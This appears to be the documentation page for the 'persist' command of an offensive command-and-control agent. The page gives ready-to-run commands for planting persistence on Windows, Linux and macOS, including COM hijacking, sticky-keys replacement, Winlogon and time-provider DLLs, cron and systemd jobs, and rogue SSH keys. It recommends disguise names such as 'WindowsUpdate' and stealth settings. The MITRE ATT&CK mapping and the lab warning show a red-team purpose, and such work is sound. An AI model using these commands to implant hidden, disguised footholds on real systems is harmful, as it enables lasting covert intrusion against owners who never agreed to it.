+++
title = "persist"
chapter = false
weight = 125
hidden = false
+++

## Summary

Install or remove persistence mechanisms. Cross-platform: Windows (registry, startup-folder, com-hijack, screensaver, IFEO, winlogon, print-processor, accessibility, active-setup, time-provider, port-monitor), Linux (crontab, systemd, shell-profile, ssh-key, xdg-autostart), macOS (launchagent, periodic, folder-action, login-item, auth-plugin). All methods support install, remove, and list actions.

### Arguments

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| method | choose_one | Yes | registry | Persistence method: `registry`, `startup-folder`, `com-hijack`, `screensaver`, `ifeo`, `winlogon`, `print-processor`, `accessibility`, `active-setup`, `time-provider`, `port-monitor`, `xdg-autostart`, or `list` |
| action | choose_one | No | install | `install` to add persistence, `remove` to delete it |
| name | string | No* | - | Registry value name or startup folder filename (*required for registry, defaults to exe name for startup) |
| path | string | No | Current agent | Path to executable. Defaults to the running agent binary. |
| hive | choose_one | No | HKCU | `HKCU` (current user, no admin needed) or `HKLM` (all users, admin required). Used by `registry` method. |
| clsid | string | No | {42aedc87-...} | COM object CLSID to hijack. Default is MruPidlList (loaded by explorer.exe at logon). Used by `com-hijack` method. |
| timeout | string | No | 60 | Idle timeout in seconds before screensaver triggers. Used by `screensaver` method. |

## Usage

### Registry Run Key Persistence

Install a Run key for the current agent (HKCU, no admin):
```
persist -method registry -action install -name "WindowsUpdate"
```

Install a Run key with custom path (HKLM, requires admin):
```
persist -method registry -action install -name "SecurityService" -path "C:\Windows\Temp\svc.exe" -hive HKLM
```

Remove a Run key:
```
persist -method registry -action remove -name "WindowsUpdate" -hive HKCU
```

### Startup Folder Persistence

Copy agent to user's Startup folder:
```
persist -method startup-folder -action install -name "updater.exe"
```

Remove from Startup folder:
```
persist -method startup-folder -action remove -name "updater.exe"
```

### COM Hijacking Persistence

Hijack a COM object CLSID so that when explorer.exe (or another application) loads the COM object, your DLL/EXE runs instead. Uses HKCU InprocServer32 override — no admin required.

Install with default CLSID (MruPidlList, loaded by explorer.exe at user logon):
```
persist -method com-hijack -action install -path "C:\Users\user\payload.dll"
```

Install with a specific CLSID:
```
persist -method com-hijack -action install -path "C:\Users\user\payload.dll" -clsid "{BCDE0395-E52F-467C-8E3D-C4579291692E}"
```

Remove COM hijack:
```
persist -method com-hijack -action remove -clsid "{42aedc87-2188-41fd-b9a3-0c966feabec1}"
```

### Screensaver Hijacking Persistence

Set the Windows screensaver to your payload. When the user is idle for the configured timeout, winlogon.exe launches the payload. Uses HKCU registry — no admin required.

Install screensaver persistence (triggers after 5 minutes idle):
```
persist -method screensaver -action install -path "C:\Users\user\payload.exe" -timeout 300
```

Install with default timeout (60 seconds):
```
persist -method screensaver -action install
```

Remove screensaver persistence:
```
persist -method screensaver -action remove
```

### IFEO Debugger Persistence

Set Image File Execution Options (IFEO) to hijack a target executable. When the target is launched, your payload runs instead with the target path as an argument. Commonly used with lock screen accessibility tools (sethc, utilman, osk). Requires admin.

Install IFEO persistence for Sticky Keys (5x Shift at lock screen):
```
persist -method ifeo -action install -name sethc.exe -path "C:\Windows\Temp\payload.exe"
```

Install for Ease of Access button:
```
persist -method ifeo -action install -name utilman.exe
```

Remove IFEO persistence:
```
persist -method ifeo -action remove -name sethc.exe
```

### Winlogon Helper Persistence

Modify the Winlogon Shell or Userinit registry values to run your payload alongside the legitimate binary at every user logon. Requires admin (HKLM).

Install via Userinit (default, more reliable):
```
persist -method winlogon -action install -name userinit -path "C:\Windows\Temp\svc.exe"
```

Install via Shell (runs alongside explorer.exe):
```
persist -method winlogon -action install -name shell -path "C:\Windows\Temp\svc.exe"
```

Remove (must specify path to strip):
```
persist -method winlogon -action remove -name userinit -path "C:\Windows\Temp\svc.exe"
```

### Print Processor Persistence

Register a DLL as a Windows print processor. The DLL is loaded by spoolsv.exe when the Print Spooler service starts. Requires admin.

Install:
```
persist -method print-processor -action install -name "FawkesProc" -path "C:\Users\user\payload.dll"
```

Remove:
```
persist -method print-processor -action remove -name "FawkesProc" -path "payload.dll"
```

### Accessibility Features Persistence

Replace Windows accessibility binaries (sethc.exe, utilman.exe, etc.) with a payload. These can be triggered from the Windows lock screen before login. Requires admin/SYSTEM.

Replace Sticky Keys (5x Shift at lock screen) with cmd.exe:
```
persist -method accessibility -action install -name sethc.exe
```

Replace Ease of Access button with custom payload:
```
persist -method accessibility -action install -name utilman.exe -path "C:\Windows\Temp\payload.exe"
```

Restore original binary from backup:
```
persist -method accessibility -action remove -name sethc.exe
```

{{% notice info %}}Supported targets: sethc.exe (Sticky Keys), utilman.exe (Ease of Access), osk.exe (On-Screen Keyboard), narrator.exe (Narrator), magnify.exe (Magnifier).{{% /notice %}}

### Active Setup Persistence

{{% notice info %}}Windows Only{{% /notice %}}

Register a StubPath command under Active Setup in HKLM. Active Setup runs the StubPath once per user at first logon. Survives profile resets and affects all users. Requires admin.

Install:
```
persist -method active-setup -action install -path "C:\Windows\Temp\payload.exe"
```

Install with custom GUID:
```
persist -method active-setup -action install -name "{CUSTOM-GUID}" -path "C:\Windows\Temp\payload.exe"
```

Remove:
```
persist -method active-setup -action remove -name "{A9E1B7F2-3D4C-5E6F-7A8B-9C0D1E2F3A4B}"
```

### Time Provider Persistence

{{% notice info %}}Windows Only{{% /notice %}}

Register a DLL as a Windows Time Provider. Loaded by the w32time service (svchost.exe) at boot. Very stealthy — time providers are rarely audited. Requires admin.

Install:
```
persist -method time-provider -action install -path "C:\Windows\Temp\payload.dll" -name "NtpClientExt"
```

Remove:
```
persist -method time-provider -action remove -name "NtpClientExt"
```

{{% notice tip %}}Restart w32time to load immediately: `net stop w32time && net start w32time`. The DLL must export `TimeProvGetTimeSysInfo`.{{% /notice %}}

### XDG Autostart Persistence

{{% notice info %}}Linux Only{{% /notice %}}

Create a `.desktop` file in `~/.config/autostart/` that runs at graphical login. Works on GNOME, KDE, XFCE, MATE, and other freedesktop-compliant environments.

Install:
```
persist -method xdg-autostart -action install -path "/tmp/agent" -name "my-service"
```

Remove:
```
persist -method xdg-autostart -action remove -name "my-service"
```

{{% notice tip %}}Default name is "system-update-notifier" — a benign-looking name. The .desktop file is created with NoDisplay=true and Hidden=false for stealth.{{% /notice %}}

### List Existing Persistence

Enumerate all known persistence entries — registry Run keys (HKCU + HKLM), startup folder, COM hijack entries, IFEO debugger entries, Active Setup entries, Winlogon helper values, print processors, accessibility binary integrity, screensaver settings, XDG autostart entries:
```
persist -method list
```

### Example Output (list)
```
=== Persistence Entries ===

--- HKCU\Software\Microsoft\Windows\CurrentVersion\Run ---
  OneDrive = "C:\Users\setup\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background

--- HKLM\Software\Microsoft\Windows\CurrentVersion\Run ---
  SecurityHealth = %windir%\system32\SecurityHealthSystray.exe

--- Startup Folder: C:\Users\setup\AppData\Roaming\...\Startup ---
  desktop.ini (174 bytes)

--- COM Hijacking (HKCU InprocServer32 overrides) ---
  {42aedc87-2188-41fd-b9a3-0c966feabec1}  MruPidlList (explorer.exe) = C:\Users\setup\payload.dll

--- Screensaver (HKCU\Control Panel\Desktop) ---
  SCRNSAVE.EXE    = C:\Users\setup\payload.exe
  ScreenSaveActive = 1 (Yes)
  ScreenSaveTimeout = 300 seconds
```

## Linux Methods

### Crontab Persistence

Install a cron job (default: every 5 minutes):
```
persist -method crontab -action install -path "/tmp/agent" -name "backup"
persist -method crontab -action install -path "/tmp/agent" -schedule "0 */4 * * *" -name "updater"
```

Remove by marker name:
```
persist -method crontab -action remove -name "backup"
```

### Systemd Service Persistence

Create a systemd user service (or system service if root):
```
persist -method systemd -action install -path "/tmp/agent" -name "user-helper"
```

Remove:
```
persist -method systemd -action remove -name "user-helper"
```

### Shell Profile Persistence

Append to .bashrc/.zshrc with marker comments:
```
persist -method shell-profile -action install -path "/tmp/agent" -name "updater"
```

Remove (cleans all profile files):
```
persist -method shell-profile -action remove -name "updater"
```

### SSH Key Persistence

Add an SSH public key to authorized_keys:
```
persist -method ssh-key -action install -path "ssh-rsa AAAA..." -name "backup-key"
persist -method ssh-key -action install -path "ssh-rsa AAAA..." -user root -name "admin-key"
```

Remove:
```
persist -method ssh-key -action remove -name "backup-key"
```

### List All (Linux)

```
persist -method list
```

### macOS Periodic Script (requires root)

Install a script to `/etc/periodic/daily/`:
```
persist -method periodic -action install -path "/tmp/agent" -schedule daily -name 500.update
```

Remove periodic script:
```
persist -method periodic -action remove -name 500.update -schedule daily
```

### macOS Folder Action

Attach an AppleScript Folder Action that executes when files are added to Downloads:
```
persist -method folder-action -action install -path "/tmp/agent" -name updater
```

Use a custom target folder (pass folder path via `-schedule` parameter):
```
persist -method folder-action -action install -path "/tmp/agent" -name updater -schedule /Users/target/Desktop
```

Remove folder action:
```
persist -method folder-action -action remove -name updater
```

### macOS Login Item

Add a Login Item via System Events (launches on user login, user-level):
```
persist -method login-item -action install -path "/tmp/agent" -name "MyHelper"
```

Remove login item:
```
persist -method login-item -action remove -name "MyHelper"
```

{{% notice tip %}}Login Items are visible in System Preferences > General > Login Items on macOS 13+. May require Accessibility permissions.{{% /notice %}}

### macOS Authorization Plugin (requires root)

Install an authorization plugin bundle in `/Library/Security/SecurityAgentPlugins/` and register it in the authorization database. Executes via SecurityAgent during the login process (T1547.002).

Install:
```
persist -method auth-plugin -action install -path "/tmp/agent" -name "FawkesAuth"
```

Remove (deregisters mechanism and deletes bundle):
```
persist -method auth-plugin -action remove -name "FawkesAuth"
```

{{% notice warning %}}Authorization plugins execute as root during the login flow. Malformed plugins may prevent login. Always test in a lab environment first.{{% /notice %}}

## MITRE ATT&CK Mapping

- T1547.001 — Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
- T1547.009 — Boot or Logon Autostart Execution: Shortcut Modification
- T1546.015 — Event Triggered Execution: Component Object Model Hijacking
- T1546.002 — Event Triggered Execution: Screensaver
- T1546.012 — Event Triggered Execution: Image File Execution Options Injection
- T1053.003 — Scheduled Task/Job: Cron
- T1543.002 — Create or Modify System Process: Systemd Service
- T1546.004 — Event Triggered Execution: Unix Shell Configuration Modification
- T1098.004 — Account Manipulation: SSH Authorized Keys
- T1543.004 — Create or Modify System Process: Launch Agent/Daemon
- T1547.004 — Boot or Logon Autostart Execution: Winlogon Helper DLL
- T1547.012 — Boot or Logon Autostart Execution: Print Processors
- T1546.008 — Event Triggered Execution: Accessibility Features
- T1547.014 — Boot or Logon Autostart Execution: Active Setup
- T1547.013 — Boot or Logon Autostart Execution: XDG Autostart Entries
- T1547.003 — Boot or Logon Autostart Execution: Time Providers
- T1546 — Event Triggered Execution: Folder Actions (macOS)
- T1053.003 — Scheduled Task/Job: Periodic Scripts (macOS)
- T1547.015 — Boot or Logon Autostart Execution: Login Items (macOS)
- T1547.002 — Boot or Logon Autostart Execution: Authentication Process (macOS Authorization Plugin)
